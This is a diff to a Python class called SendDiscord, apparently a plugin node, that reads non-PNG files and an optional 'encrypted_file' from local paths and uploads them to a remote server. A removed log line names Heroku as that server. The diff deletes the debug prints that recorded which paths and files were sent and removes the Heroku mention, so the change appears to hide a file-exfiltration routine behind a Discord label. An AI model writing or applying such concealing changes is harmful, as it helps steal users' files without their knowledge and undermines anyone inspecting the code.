@@ -23,11 +23,6 @@ class SendDiscord:
     FUNCTION = "send_to_discord"
 
     def send_to_discord(self, path, user_message="", user_name="Default Username", encrypted_file=None):
-        print("Starting send_to_discord function...")
-        print(f"Path received: {path}")
-        print(f"User message: {user_message}")
-        print(f"User name: {user_name}")
-        print(f"Encrypted file received: {encrypted_file}")
 
         if isinstance(path, tuple):
             path = path[1] if len(path) > 1 and isinstance(
@@ -41,11 +36,10 @@ class SendDiscord:
 
         files = []
         for p in path:
-            if not p.endswith('.png'):  # PNG dosyalarını hariç tut
+            if not p.endswith('.png'):
                 with open(p, 'rb') as file:
                     files.append(
                         ('file', (os.path.basename(p), file.read(), 'application/octet-stream')))
-        print(f"Files prepared for sending: {[f[0] for f in files]}")
 
         if encrypted_file:
             encrypted_file_path = Path(
@@ -54,7 +48,6 @@ class SendDiscord:
                 with open(encrypted_file_path, 'rb') as file:
                     files.append(
                         ('encrypted_file', (encrypted_file, file.read(), 'application/octet-stream')))
-                print(f"Encrypted file added: {encrypted_file}")
 
         payload = {'user_name': user_name, 'user_message': user_message}
 
@@ -66,7 +59,7 @@ class SendDiscord:
             )
             print(f"Response status code: {response.status_code}")
             if response.status_code == 200:
-                print("Files sent successfully to Heroku")
+                print("Files sent successfully")
                 print(f"Response content: {response.json()}")
                 return [response.json()]
             else:
